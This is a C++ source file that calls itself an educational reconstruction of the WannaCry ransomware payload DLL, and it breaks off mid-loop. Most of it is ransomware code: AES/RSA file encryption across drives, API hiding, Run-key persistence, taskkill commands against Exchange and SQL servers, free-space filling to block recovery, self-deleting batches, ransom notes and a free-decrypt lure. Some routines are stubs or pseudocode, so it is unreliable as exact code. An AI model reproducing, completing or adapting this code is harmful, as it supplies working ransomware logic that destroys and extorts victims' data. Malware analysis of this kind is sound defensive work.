// ============================================================================
// wcry_payload_dll.cpp — WannaCry ransomware core (t.wnry payload DLL), educational reconstruction.
// Role: on launch it loads the c.wnry config, builds the RSA/AES key set, then walks every drive —
//   staging files to .WNCYR and encrypting them to .WNCRY — while installing persistence.
// Education note: ENCRYPT-ONLY by design — this DLL cannot decrypt anything; the payment UI (u.wnry / @WanaDecryptor@.exe) does that.
// ============================================================================

#include <windows.h>
// File and crypto APIs are resolved dynamically at startup — see Globals below.

// ---------------------------------------------------------------------------
// Globals — dynamically resolved API pointers and per-install state.
// ---------------------------------------------------------------------------
// File APIs are resolved at startup so they never appear in the import table.
static pfnCreateFileW  g_pCreateFileW;
static pfnWriteFile    g_pWriteFile;
static pfnReadFile     g_pReadFile;
static pfnMoveFileW    g_pMoveFileW;
static pfnMoveFileExW  g_pMoveFileExW;
static pfnDeleteFileW  g_pDeleteFileW;
static pfnCloseHandle  g_pCloseHandle;

// Crypto API pointers — resolved from advapi32 at runtime by the crypto-init
// routine, again to keep them out of the static imports. CryptExportKey,
// CryptGenRandom, CryptGetKeyParam and CryptReleaseContext, by contrast,
// remain bare static imports in the original binary.
typedef BOOL (WINAPI *pfnCryptAcquireContextA)(HCRYPTPROV *, LPCSTR, LPCSTR, DWORD, DWORD);
typedef BOOL (WINAPI *pfnCryptImportKey)(HCRYPTPROV, const BYTE *, DWORD, HCRYPTKEY, DWORD, HCRYPTKEY *);
typedef BOOL (WINAPI *pfnCryptDestroyKey)(HCRYPTKEY);
typedef BOOL (WINAPI *pfnCryptEncrypt)(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE *, DWORD *, DWORD);
typedef BOOL (WINAPI *pfnCryptDecrypt)(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE *, DWORD *);
typedef BOOL (WINAPI *pfnCryptGenKey)(HCRYPTPROV, ALG_ID, DWORD, HCRYPTKEY *);

static pfnCryptAcquireContextA g_pCryptAcquireContextA;
static pfnCryptImportKey       g_pCryptImportKey;
static pfnCryptDestroyKey      g_pCryptDestroyKey;
static pfnCryptEncrypt         g_pCryptEncrypt;
static pfnCryptDecrypt         g_pCryptDecrypt;
static pfnCryptGenKey          g_pCryptGenKey;

static BYTE  g_config[0x30C];            // full c.wnry config image (780 bytes)
static BYTE  g_state[0x88];              // %08X.res app-state image (8-byte install id at +0)
static char  g_resName[16];              // "00000000.res" — saved app state
static char  g_pkyName[16];              // "00000000.pky" — RSA public key
static char  g_ekyName[16];              // "00000000.eky" — RSA private key (encrypted export)
static int   g_decKeyReady;              // set once a valid .dky/.pky pair is restored; doubles as the global stop-encrypting flag
static int   g_isSystem;                 // running as LOCAL SYSTEM
static char  g_tag[0x100];               // per-install random tag (Run-key value name)
static time_t g_installTime;             // first-seen timestamp
static time_t g_lastCheck;               // last payment-server check
static LONG  g_lastDriveSerial = -1;     // one-walker-per-drive guard
static HINSTANCE g_hinst;                // our module handle (saved by DllMain)

// Mutex naming: the payload carries two adjacent look-alike literals —
//   "Global\MsWinZonesCacheCounterMutexA"   and the same string plus a
//   trailing '0'. Creation uses the '0'-suffixed name (built at runtime by
//   appending to the base literal); the existence check uses the base
//   literal without the "Global\" prefix. The name is camouflage: it mimics
//   an IE zone-cache counter, and any second infection in any user session
//   becomes a silent no-op.
static const char WANACRY_MAGIC[] = "WANACRY!";   // 8-byte signature at offset 0 of every encrypted file

// ---------------------------------------------------------------------------
// c.wnry config I/O — the 780-byte plaintext blob shipped next to the payload
// (wallet addresses, TOR endpoints, attacker key data, timers).
// ---------------------------------------------------------------------------
// Loads the config into the global cache (doRead != 0), or writes the cache
// back out to disk (doRead == 0 — used to persist state updates).
int ReadConfig(int doRead)
{
    FILE *f = fopen("c.wnry", doRead ? "rb" : "wb");
    if (!f) return 0;
    size_t n = doRead ? fread(g_config, 0x30C, 1, f)
                      : fwrite(g_config, 0x30C, 1, f);
    fclose(f);
    return n != 0;
}

// ---------------------------------------------------------------------------
// Process helpers
// ---------------------------------------------------------------------------
// Spawns a child process, optionally waits up to timeoutMs (killing it on
// timeout) and reports its exit code. Used for the decryptor UI, registry
// commands, the taskkill sweep and the self-delete batch.
int RunProcess(LPSTR cmdline, DWORD timeoutMs, LPDWORD exitCode)
{
    STARTUPINFOA si = {sizeof(si)}; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = 0;
    PROCESS_INFORMATION pi = {};
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return 0;
    if (timeoutMs) {
        if (WaitForSingleObject(pi.hProcess, timeoutMs) != WAIT_OBJECT_0)
            TerminateProcess(pi.hProcess, (UINT)-1);
        if (exitCode) GetExitCodeProcess(pi.hProcess, exitCode);
    }
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return 1;
}

// Self-delete: a running executable cannot delete its own image file, so the
// payload writes its delete command into a randomly named .bat and launches
// it detached; the batch erases the binary once the process is gone.
static void RunSelfDeleteBatch(const char *target)
{
    srand(GetTickCount());
    char name[260];
    sprintf(name, "%d%d.bat", rand(), (unsigned)time(NULL));
    FILE *f = fopen(name, "wb");
    if (!f) return;
    fprintf(f, target);
    fclose(f);
    RunProcess(name, 0, NULL);
}

// ---------------------------------------------------------------------------
// Privilege / environment checks
// ---------------------------------------------------------------------------
// Returns the current user's SID in string (SDDL) form — e.g. the well-known
// LOCAL SYSTEM SID "S-1-5-18". ConvertSidToStringSidW is loaded dynamically.
static int GetUserSidString(wchar_t *out)
{
    HANDLE tok;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) return 0;
    DWORD need;
    GetTokenInformation(tok, TokenUser, NULL, 0, &need);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) return 0;
    PTOKEN_USER tu = (PTOKEN_USER)GlobalAlloc(GPTR, need);
    if (!GetTokenInformation(tok, TokenUser, tu, need, &need)) return 0;
    HMODULE adv = LoadLibraryA("advapi32.dll");
    typedef BOOL (WINAPI *pfnC2S)(PSID, LPWSTR*);
    pfnC2S conv = (pfnC2S)GetProcAddress(adv, "ConvertSidToStringSidW");
    if (!conv) return 0;
    LPWSTR sid;
    if (!conv(tu->User.Sid, &sid)) return 0;
    wcscpy(out, sid);
    return 1;
}

// SYSTEM detection, two attempts:
//   1. compare the process SID string against the LOCAL SYSTEM SID;
//   2. only if the SID could not be read at all, fall back to comparing the
//      account name against "SYSTEM".
// The result is stored in g_isSystem by the caller.
int IsSystemUser(void)
{
    wchar_t user[300] = {}; DWORD n = 300;
    wchar_t sid[0x100];
    if (GetUserSidString(sid))
        return _wcsicmp(sid, L"S-1-5-18") == 0;             // only this check
    GetUserNameW(user, &n);
    return _wcsicmp(user, L"SYSTEM") == 0;                  // fallback branch
}

// Membership test for the built-in Administrators group.
int IsCurrentUserAdmin(void)
{
    SID_IDENTIFIER_AUTHORITY nt = { SECURITY_NT_AUTHORITY };
    PSID admin;
    if (!AllocateAndInitializeSid(&nt, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0,0,0,0,0,0, &admin)) return 0;
    BOOL is = FALSE;
    CheckTokenMembership(NULL, admin, &is);
    FreeSid(admin);
    return is;
}

// Grants the Everyone group access to the infection mutex, so instances
// running in other sessions or as other users (e.g. services) observe and
// honor the same single-instance state.
static void MakeMutantWorldAccessible(HANDLE h)
{
    PACL oldAcl, newAcl; PSECURITY_DESCRIPTOR sd;
    GetSecurityInfo(h, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION,
                    NULL, NULL, &oldAcl, NULL, &sd);
    EXPLICIT_ACCESSA ea = {};
    ea.grfAccessPermissions = 0x1F0001;
    ea.grfAccessMode = GRANT_ACCESS;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = (LPTSTR)"EVERYONE";
    SetEntriesInAclA(1, &ea, oldAcl, &newAcl);
    SetSecurityInfo(h, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION,
                    NULL, NULL, newAcl, NULL);
}

// Per-install tag: the RNG is seeded by multiplying the computer-name
// characters together, then the output is 8-15 lowercase letters followed by
// exactly 3 digits. The tag becomes the registry Run-key value name, giving
// each victim a unique but inobtrusive autorun entry.
static char *GenRandomTag(char *out)
{
    WCHAR host[400] = {}; DWORD n = 399;
    GetComputerNameW(host, &n);
    unsigned seed = 1;
    for (size_t i = 0; i < wcslen(host); i++) seed *= (unsigned short)host[i];
    srand(seed);
    int len = rand() & 0x80000007;
    int i = 0;
    for (; i < len + 8; i++)  out[i] = rand() % 26 + 'a';
    for (; i < len + 11; i++) out[i] = rand() % 10 + '0';   // exactly 3 digits
    out[i] = 0;
    return out;
}

// ---------------------------------------------------------------------------
// RSA key management (CryptoAPI). The key-generation call hardcodes its
// algorithm id rather than using a named constant.
// ---------------------------------------------------------------------------
struct RsaCtx {                                     // 0x28-byte object
    CritSectObj cs;                                 // +0x0  guard for concurrent use
    HCRYPTPROV hProv;                               // +0x4  crypto provider handle
    HCRYPTKEY hEncryptKey;                          // +0x8  ENCRYPT slot (.pky / embedded blob)
    HCRYPTKEY hDecryptKey;                          // +0xC  DECRYPT slot (.dky / embedded blob)
};

// Acquires an RSA/AES crypto provider context, retrying once on failure.
static BOOL RsaCtxAcquire(RsaCtx *c)
{
    for (int i = 0; i < 2; i++)
        if (g_pCryptAcquireContextA(&c->hProv, NULL, NULL,
                PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return TRUE;
    return FALSE;
}

// Key setup. The binary ships two hardcoded 2048-bit RSA public-key blobs
// (the attacker's keys) inside the DLL itself:
//   * First run, no .pky yet (pubFile == NULL): import embedded blob #1 into
//     the ENCRYPT slot. Files are then wrapped to the attacker's built-in
//     public key — the malware always carries a usable key.
//   * Otherwise: import the public key from the .pky file. If that import
//     fails, import embedded blob #2 into the DECRYPT slot, generate a fresh
//     RSA-2048 pair, export its public half to the .pky and its encrypted
//     private half to the .eky, then re-import the .pky. (.eky is the
//     victim's own key-escrow file, paid for at "purchase" time.)
static int RsaCtxInit(RsaCtx *c, const char *pubFile, const char *privFile)
{
    if (!RsaCtxAcquire(c)) goto fail;
    if (!pubFile) {
        if (!g_pCryptImportKey(c->hProv, EMBEDDED_BLOB_1000D054 /*0x114 B*/,
                            0x114, 0, 0, &c->hEncryptKey)) goto fail;
    } else {
        if (!ImportKeyFromFile(c, pubFile, &c->hEncryptKey)) {
            if (!g_pCryptImportKey(c->hProv, EMBEDDED_BLOB_1000CF40 /*0x114 B*/,
                                0x114, 0, 0, &c->hDecryptKey)) goto fail;
            if (!g_pCryptGenKey(c->hProv, 1,
                                (2048 << 16) | CRYPT_EXPORTABLE,
                                &c->hEncryptKey)) goto fail;
            if (!ExportKeyToFile(c->hProv, c->hEncryptKey,
                                 PUBLICKEYBLOB, pubFile)) goto fail;
            if (privFile) ExportEncryptedPrivateKey(c, privFile);
            if (!ImportKeyFromFile(c, pubFile, &c->hEncryptKey)) goto fail;
        }
    }
    return 1;
fail:
    RsaCtxFree(c);
    return 0;
}

// Release both key slots and the crypto provider.
static void RsaCtxFree(RsaCtx *c)
{
    if (c->hEncryptKey) { g_pCryptDestroyKey(c->hEncryptKey); c->hEncryptKey = 0; }
    if (c->hDecryptKey) { g_pCryptDestroyKey(c->hDecryptKey); c->hDecryptKey = 0; }
    if (c->hProv) { CryptReleaseContext(c->hProv, 0); c->hProv = 0; }
}

// Verifies that a .pky public key and a .dky private key actually match:
// encrypts the constant string "TESTDATA" with the public key, decrypts it
// with the private key, and compares the round trip. The context is torn
// down on mismatch.
static int TestKeyPair(RsaCtx *c, const char *pubFile, const char *privFile)
{
    char msg[520]; strcpy(msg, "TESTDATA");
    int mlen = 9;
    ImportKeyFromFile(c, pubFile,  &c->hEncryptKey);   // public key → ENCRYPT slot (+0x8)
    ImportKeyFromFile(c, privFile, &c->hDecryptKey);   // private key → DECRYPT slot (+0xC)
    g_pCryptEncrypt(c->hEncryptKey, 0, TRUE, 0, msg, &mlen, 0x200);
    g_pCryptDecrypt(c->hDecryptKey, 0, TRUE, 0, msg, &mlen);
    if (strncmp(msg, "TESTDATA", 9) != 0) { RsaCtxFree(c); return 0; }
    return 1;
}

// Payment gate: checks for the victim's saved key files (%08X.dky private
// key alongside %08X.pky) and, via TestKeyPair, whether they form a working
// pair. Only returns true once a usable decryption key exists on disk —
// i.e. after payment, when the attacker's decryptor has dropped the private
// key. The whole encryptor shuts up and stops encrypting once this opens.
static int TryRestoreDecryptionKey(DWORD id)
{
    char dky[52]; sprintf(dky, "%08X.dky", id);
    if (!FileExists(dky)) return 0;
    if (!FileExists(g_pkyName)) return 0;
    RsaCtx c;
    return TestKeyPair(&c, g_pkyName /*pub*/, dky /*priv*/);
}
// Polls the payment gate every 5 seconds; its result feeds the global flag
// every other worker thread watches.
static DWORD WINAPI WaitDecryptionKeyThread(LPVOID)
{ while (!(g_decKeyReady = TryRestoreDecryptionKey(0))) Sleep(5000); return 0; }

// ---------------------------------------------------------------------------
// AES — software implementation, ENCRYPTION ONLY.
// There is no block-decrypt routine anywhere in this code: the inverse
// tables exist solely to build the inverse key schedule. Modes:
//   1       = CBC encrypt
//   2       = CFB-style encrypt (dead code — never called)
//   0/other = ECB encrypt
// Classic T-table design: S-box, Rcon, four 256-entry round tables, plus
// shift-offset tables for the wider key sizes.
// ---------------------------------------------------------------------------
struct AesCtx {                                     // ~0x458-byte context object
    BYTE  ready;          // +0x004  key schedule built?
    DWORD Nr;             // +0x410  round count
    DWORD keySize;        // +0x3C8  (16/24/32)
    DWORD ivSize;         // +0x3CC  (16/24/32 — also selects the wide-block shift path)
    BYTE  iv[16];         // +0x3F0  CBC chaining register
    // The KEY ITSELF IS NEVER STORED — only the expanded schedules below persist.
    DWORD enc[60];        // +0x008  encryption round keys
    DWORD dec[60];        // +0x1E8  decryption round keys (InvMixColumn of enc)
};

// Validates the key/IV sizes, expands the key into the encryption round-key
// schedule (and its InvMixColumn-transformed counterpart), and stores the
// IV. The raw key bytes are never retained.
static void AesSetKey(AesCtx *c, const BYTE *key, int keySize,
                      const BYTE *iv,  int ivSize)
{
    if (!key || (keySize!=16 && keySize!=24 && keySize!=32) ||
                (ivSize!=16 && ivSize!=24 && ivSize!=32)) throw;
    c->keySize = keySize; c->ivSize = ivSize;
    // a scratch buffer at +0x3D0 also receives the IV bytes; the key is only
    // expanded, never stored
    c->Nr = /* 10 rounds for AES-128, 12 for 192-bit, 14 for 256-bit keys */;
    // Rijndael key expansion into enc[]; inverse schedule (InvMixColumn) into dec[]
    c->ready = 1;
}

// One AES block encryption through the T-tables; the final round applies
// SubBytes/ShiftRows via the S-box and XORs the last round key. 192/256-bit
// keys take a separate path whose table selection is driven by the IV size.
static void AesEncryptBlock(AesCtx *c, const BYTE in[16], BYTE out[16])
{
}

// Bulk transforms: mode 1 = CBC encrypt (plaintext XORed into the chaining
// register, then encrypted), mode 2 = CFB-style encrypt (block encrypted
// first, XORed with input; output feeds the chain — unused), 0/other = ECB.
static void AesCryptModes(AesCtx *c, BYTE *in, BYTE *out, DWORD len, int mode)
{
    BYTE chain[16];
    if (mode == 1) {                    // CBC-encrypt: xor-then-encrypt
        memcpy(chain, c->iv, 16);
        for (DWORD b = 0; b < len/16; b++) {
            for (int i = 0; i < 16; i++) chain[i] ^= in[b*16+i];
            AesEncryptBlock(c, chain, &out[b*16]);
            memcpy(chain, &out[b*16], 16);
        }
    } else if (mode == 2) {             // CFB-style: out = E(chain) ^ in; chain = out
        memcpy(chain, c->iv, 16);
        for (DWORD b = 0; b < len/16; b++) {
            AesEncryptBlock(c, chain, &out[b*16]);
            for (int i = 0; i < 16; i++) out[b*16+i] ^= in[b*16+i];
            memcpy(chain, &out[b*16], 16);
        }
    } else {                            // ECB-encrypt
        for (DWORD b = 0; b < len/16; b++) AesEncryptBlock(c, &in[b*16], &out[b*16]);
    }
}

// ---------------------------------------------------------------------------
// Per-file encryption — THE core routine. Every file goes through two passes:
//
//   mode 3 — STAGING (.WNCYR): opens the original file read-write IN PLACE,
//     appends a copy of its first 64 KiB to the end, zeroes the original
//     first 64 KiB, then writes a fresh "WANACRY!" header over the wiped
//     head and exits. The body is NOT encrypted here — the plaintext now
//     survives only at the tail of the file.
//
//   mode 4 — FINAL (.WNCYR -> .WNCRY): reopens the staged file read-only and
//     writes the finished .WNCRY output: the appended 64 KiB prolog is
//     AES-encrypted first, then the rest of the body is encrypted in 1 MiB
//     chunks. Only this pass awards the free-decrypt carrot.
//
// Output file layout:
//   +0x000  "WANACRY!" magic (8 bytes)
//   +0x008  u32 rsaLen — length of the wrapped key that follows (the reader
//           accepts anything < 0x201; real files carry 0x100)
//   +0x00C  rsaEncKey[rsaLen] — per-file AES key wrapped under an RSA public key
//   +0x10C  u32 type  — which pass produced the file
//   +0x110  u64 original file size
//   +0x118  AES-128-CBC ciphertext, NULL IV
//
// BOTH passes are ENCRYPT. There is no decrypt branch in this DLL — victims'
// files are only ever decrypted by the separate payment-UI program.
// ---------------------------------------------------------------------------
int CryptorProcessFile(RsaCtx *c, LPCWSTR origPath, LPCWSTR newPath, UINT mode)
{
    // staging rewrites the original in place (read-write); the final pass
    // only reads (output goes to the new .WNCRY file)
    DWORD access = (mode == 3) ? GENERIC_READ|GENERIC_WRITE
                               : GENERIC_READ;
    HANDLE h = g_pCreateFileW(origPath, access, FILE_SHARE_READ|FILE_SHARE_WRITE,
                              NULL, OPEN_EXISTING, 0, NULL);
    // if the open fails, a raw-sector recovery helper gets one attempt and
    // the open is retried with full sharing flags
    if (h == INVALID_HANDLE_VALUE && RecoverRawSector() &&
        (h = g_pCreateFileW(origPath, access, 3, NULL, OPEN_EXISTING, 0, NULL),
         h == INVALID_HANDLE_VALUE))
        return 0;
    LARGE_INTEGER size; GetFileSizeEx(h, &size);
    FILETIME ct, at, wt; GetFileTime(h, &ct, &at, &wt);

    // already-encrypted probe: if the file carries the "WANACRY!" magic and a
    // sane wrapped-key length, read its recorded pass type and skip when the
    // file is already at or beyond the current pass (idempotent re-runs)
    BYTE magic[8]; DWORD got, rsaLen, ftype;
    if (g_pReadFile(h, magic, 8, &got, NULL) && !memcmp(magic, WANACRY_MAGIC, 8) &&
        g_pReadFile(h, &rsaLen, 4, &got, NULL) && rsaLen < 0x201) {
        if (rsaLen == 0x100 && g_pReadFile(h, rsaBuf, 0x100, &got, NULL) &&
            g_pReadFile(h, &ftype, 4, &got, NULL) && mode <= ftype)
            return 1;                                   // already at/after this stage
    }
    SetFilePointer(h, 0, NULL, FILE_BEGIN);

    HANDLE out;
    if (mode == 4) {
        // final pass: create the fresh output file; when consuming a type-3
        // staged file the effective size shrinks by the 64 KiB prolog copy
        out = g_pCreateFileW(newPath, GENERIC_WRITE, 0, NULL,
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (out == INVALID_HANDLE_VALUE &&
            (out = g_pCreateFileW(newPath, GENERIC_WRITE, 3, NULL,
                                  CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL),
             out == INVALID_HANDLE_VALUE)) return 0;
        if (ftype == 3) size.QuadPart -= 0x10000;
    } else {
        // staging pass: read the first 64 KiB, append it at EOF, then rewrite
        // the head zeroed — original data survives only at the tail
        if (!g_pReadFile(h, buf1, 0x10000, &got, NULL) || got != 0x10000) return 0;
        SetFilePointer(h, 0, NULL, FILE_END);
        if (!g_pWriteFile(h, buf1, 0x10000, &w, NULL) || w != 0x10000) return 0;
        memset(buf1, 0, 0x10000);
        SetFilePointer(h, 0, NULL, FILE_BEGIN);
        if (!g_pWriteFile(h, buf1, 0x10000, &w, NULL) || w != 0x10000) return 0;
        SetFilePointer(h, 0, NULL, FILE_BEGIN);
        out = h;                                        // header is written over the wiped head
    }

    // free-decrypt carrot — final pass ONLY: for files under ~200 MiB, roll a
    // 1-in-100 chance (capped at 10 files total) to wrap this file's key under
    // the ATTACKER'S embedded public key. Those lucky files decrypt without
    // payment — bait proving to the victim that "decryption works".
    BYTE aesKey[16]; DWORD encKeyLen = 0x200;           // buffer capacity for the wrapped key
    if (mode==4 && size.HighPart<1 && size.LowPart < 0xC800000 &&
        g_freeMax && rand() % g_freeDenom == 0 && g_freeCount < g_freeMax) {
        isFree = 1; keySlot = (BYTE*)c+0x2C; g_freeCount++;
    }
    RsaWrapFileKey(keySlot, aesKey, &encKeyLen);        // wrap the per-file AES key (RSA)
    AesSetKey((AesCtx*)((char*)c+0x54), aesKey, 16, NULL /*zero IV*/, 16);
    memset(aesKey, 0, 16);                              // plaintext file key wiped at once

    // encrypted-file header (layout table above)
    g_pWriteFile(out, WANACRY_MAGIC, 8, &w, NULL);
    g_pWriteFile(out, &encKeyLen, 4, &w, NULL);
    g_pWriteFile(out, rsaBuf, encKeyLen, &w, NULL);
    g_pWriteFile(out, &mode, 4, &w, NULL);
    g_pWriteFile(out, &size, 8, &w, NULL);

    if (mode != 4) goto finish;                         // staging: header only, body untouched

    if (ftype == 3) {   // consume the staged prolog: encrypt the appended 64 KiB first
        SetFilePointer(h, -0x10000, NULL, FILE_END);
        g_pReadFile(h, buf1, 0x10000, &got, NULL);
        AesCryptModes(ctx, buf1, buf2, 0x10000, 1);     // CBC-encrypt (the copy is still plaintext)
        g_pWriteFile(out, buf2, 0x10000, &w, NULL);
        SetFilePointer(h, 0x10000, NULL, FILE_BEGIN);   // resume behind the wiped head copy
    }
    while (size not exhausted) {
        if (g_cancelFlag && *g_cancelFlag) break;       // stop once the decryption key is restored (paid)
        g_pReadFile(h, buf1, 0x100000, &got, NULL);     // 1 MiB chunks
        n = ((got-1)>>4)+1 << 4;                        // round up to the 16-byte AES block
        memset(buf1+got, 0, n-got);                     // zero-fill the padding
        AesCryptModes(ctx, buf1, buf2, n, 1);           // CBC-encrypt
        g_pWriteFile(out, buf2, n, &w, NULL);
    }
finish:
    SetFileTime(out, &ct, &at, &wt);                    // carry over the original timestamps
    g_pCloseHandle(h); g_pCloseHandle(out);
    g_pMoveFileW(origPath, newPath);                    // original → .WNCRY name
    if (ok && onComplete) onComplete(origPath, newPath, size.HighPart,
                                     size.LowPart, mode, isFree); // completion callback (notification queue)
    return ok;
}

// Drives one file through one pass: builds the destination name (.WNCYR for
// staging — replacing the extension if present, appending it otherwise;
// .WNCRY for the final pass), never overwrites an existing target, removes
// partial output on failure, and queues the rename notification at the end.
int CryptorEncryptFileStage(RsaCtx *c, wchar_t *path, UINT mode)
{
    if (mode == 4) {
        wchar_t dst[0x360]; wcscpy(dst, path);
        wchar_t *dot = wcsrchr(dst, L'.'); if (!dot) dot = dst;
        if (_wcsicmp(dot, L".WNCYR") == 0) wcscpy(dot, L".WNCRY");
        else wcscat(dot, L".WNCRY");
    } else swprintf(dst, fmt_1000CBD8, path);           // staging: "<original path>.WNCYR"
    if (GetFileAttributesW(dst) == INVALID_FILE_ATTRIBUTES) {   // destination free? only then run
        if (!CryptorProcessFile(c, path, dst, mode)) { DeleteFileW(dst); return 0; }
    }
    if (mode == 4) CryptorQueueNotify(c, path);         // queue the rename notification
    return 1;
}

// ---------------------------------------------------------------------------
// Extension classification — routes each file to the right pass:
//   1 = executable (.exe/.dll)                          — never encrypted
//   6 = .WNCRY                                          — already final, skip
//   2 = first document family (.doc/.xls/.ppt/.rtf/…)   — encrypted in pass 1
//   3 = second document family (.docb/.docm/.docx/…)    — encrypted in pass 2
//   4 = .WNCRYT temporary, 5 = staged .WNCYR, 0 = everything else
// ---------------------------------------------------------------------------
int GetFileExtClass(const wchar_t *path)
{
    wchar_t *dot = wcsrchr(path, L'.');
    if (!dot) return 0;
    if (!_wcsicmp(dot, L".exe") || !_wcsicmp(dot, L".dll")) return 1;
    if (!_wcsicmp(dot, L".WNCRY")) return 6;
    for (doclist1) if (match) return 2;                 // .doc/.xls/.ppt/.rtf/…
    for (doclist2) if (match) return 3;                 // .docb/.docm/.docx/…
    if (!_wcsicmp(dot, L".WNCRYT")) return 4;
    if (!_wcsicmp(dot, L".WNCYR"))  return 5;
    return 0;                                           // everything else
}

// Stage/class decision matrix: returns 1 = stage-encrypt, 2 = delete,
// 3 = retry later, 4 = finalize, 0 = leave alone. Candidate files must be
// between 1 KiB and ~200 MiB (the larger bound appears only in the
// free-decrypt carrot check). Class-2 documents are staged in pass 1 and
// finalized in pass 2; class-3 documents run exactly one pass behind them.
int DecideFileAction(RsaCtx *c, UINT stage)
{
    if (stage > 3) return 4;
    int cls = this->fileClass;                          // +0x4E0
    if (!cls) return 1;
    if (stage == 3) return 4;
    if (cls == 5) return 1;
    if (cls == 4) return 2;
    bool tooBig = g_stopFlag || fileSize < 0x401 || fileSize > 0xC7FFFFF;
    if (stage == 1) { if (cls == 2) return tooBig ? 3 : …; if (cls == 3) return 1; }
    if (stage == 2) { if (cls == 2) return 1; if (cls == 3) return tooBig ? 3 : …; }
    return 0;
}

// Executes one decision for one file: skip, delete, finalize, or stage-
// encrypt. After a successful staging the .WNCYR name is appended and the
// list entry is flagged for the later finalize pass.
int StageFile(wchar_t *path, UINT stage)
{
    switch (DecideFileAction(path, stage)) {
    case 0: return 1;
    case 2: g_pDeleteFileW(path); return 1;
    case 4: CryptorEncryptFileStage(path, 4); return 1;   // finalize .WNCYR→.WNCRY
    case 3: break;
    }
    if (!CryptorEncryptFileStage(path, 3)) return 0;      // stage-encrypt → .WNCYR
    wcscat(path, L".WNCYR"); wcscat(path2, L".WNCYR");
    path[0x270/2] = L'\x05';                            // flag the list entry as staged
    return 0;
}

// Directory walker — discovery logic: enumerates
// with a "\\*" pattern, skips "." and "..", honors the directory exclusion
// list, and feeds every candidate (right class, right size, not yet
// encrypted) into the staging pass; unfinished items go to a retry list.
int CryptorWalkDirectory(RsaCtx *c, LPCWSTR dir, int, int depth, int doDrop, …)
{
    …
}

// Per-directory multi-pass driver — the original binary's internal name for
// this function was "DecryptDirectory", but no decryption ever occurs: the
// stages are delete / stage-encrypt / finalize. Walks the tree once, then
// chews through the retry list stage by stage until every path is done,
// then flushes the notification queue and the free-decrypt bookkeeping
// (f.wnry).
int CryptorMultiPassEncryptDir(RsaCtx *c, LPCWSTR dir, int)
{
    CryptorWalkDirectory(c, dir, out, -1, …);
    for (UINT stage = 2; stage <= 4; stage++) {
        for (path in list) {
            if (g_cancelFlag && *g_cancelFlag) break;
            if (StageFile(path, stage)) list.remove(path);
        }
    }
    CryptorQueueNotify(c, NULL);
    drain f.wnry free-list;
    return 1;
}

// Exclusion list keeps the host alive (and the ransom note reachable):
// Intel, ProgramData, Windows, Program Files / Program Files (x86),
// AppData\Local\Temp, Local Settings\Temp, "Temporary Internet Files",
// Content.IE5, and any directory containing the "This folder protects…"
// ransom-note marker file. UNC-path probing is approximated here.

// Notification worker: polls a queue for up to 60 s (60 x 1 s sleeps) under
// the context's critical section; for each finished file it moves it to the
// final name (with a move-on-reboot fallback flag) and hides it.

// ---------------------------------------------------------------------------
// Persistence, ransom note, decoys, anti-recovery
// ---------------------------------------------------------------------------
// PersistRunKeyThread — autorun persistence: writes a Run key (HKCU; HKLM
//   when admin) whose value NAME is a fresh random tag and whose data
//   re-launches the payload. 10 s command timeout.
// InstallDecryptorShortcuts — drops a copy of the decryptor UI (u.wnry)
//   plus a small VBS launcher and a self-deleting .bat, giving the victim a
//   desktop path to the payment screen.
// WriteRansomNote — drops @Please_Read_Me@.txt from the r.wnry template; the
//   demand renders as "$%d worth of bitcoin" or "%.1f BTC" per a config flag.
// GetOrCreateWorkDir — ensures a per-drive work folder under "$RECYCLE" and
//   hides it ("attrib +h +s") so victims don't stumble over it.
// FillDiskFreeSpace — anti-recovery: fills free space with junk files
//   (repeated ~10 MiB blocks, 1 GB+ per drive, brief pauses between waves)
//   so deleted originals cannot be carved back. Skipped once a decryption
//   key has been restored.
// EncryptDrive — encrypts one drive's contents; an interlocked serial makes
//   sure only one worker touches a given drive (up to 30 s wait); files
//   already finalized are skipped.
// WatchNewDrives — polls every 3 s for freshly mounted drives and spawns a
//   worker thread to encrypt each new one.

// Main encrypt loop — repeats until the payment gate opens (a valid
// .dky/.pky pair restores g_decKeyReady). Each pass:
//   * from the second pass on, kill database/mail servers that hold locks
//     on user data (Exchange, SQL Server, MySQL);
//   * sweep all local drives Z:→C:, then all network drives Z:→C:;
//   * re-enumerate the user's profile folders;
//   * on the first cycle, run the decryptor UI's connectivity check and,
//     afterwards, fill free space on every fixed drive (blocks recovery);
//   * persist app state and sleep 60 s, then loop.
// On first entry it also seeds the free-decrypt parameters (10 files,
// 1-in-100 odds), records the install time and runs the decryptor once
// with the "fi" argument.
void MainEncryptLoop(RsaCtx *c)
{
    char cmdline[0x400];                                    // RunProcess argv
    if (!FileExists("f.wnry"))
        CryptorSetFreeDecryptParams(c, 10, 100);            // 10 free files max, 1-in-100 odds
    if (!g_installTime) {
        time(&g_installTime);
        SaveAppState();                                     // persist install time to the .res state file
        sprintf(cmdline, "%s fi", "@WanaDecryptor@.exe");
        RunProcess(cmdline, 100000, NULL);
        ReadConfig(1);
    }
    InstallDecryptorShortcuts();
    WriteRansomNote();
    EncryptUserFolders();

    int pass = 0;
    while (!g_decKeyReady) {
        InterlockedExchange(&g_lastDriveSerial, -1);
        if (pass == 1) {
            RunProcess("taskkill.exe /f /im Microsoft.Exchange.*", 0, NULL);
            RunProcess("taskkill.exe /f /im MSExchange*", 0, NULL);
            RunProcess("taskkill.exe /f /im sqlserver.exe", 0, NULL);
            RunProcess("taskkill.exe /f /im sqlwriter.exe", 0, NULL);
            RunProcess("taskkill.exe /f /im mysqld.exe", 0, NULL);
        }
        DWORD drives = GetLogicalDrives();
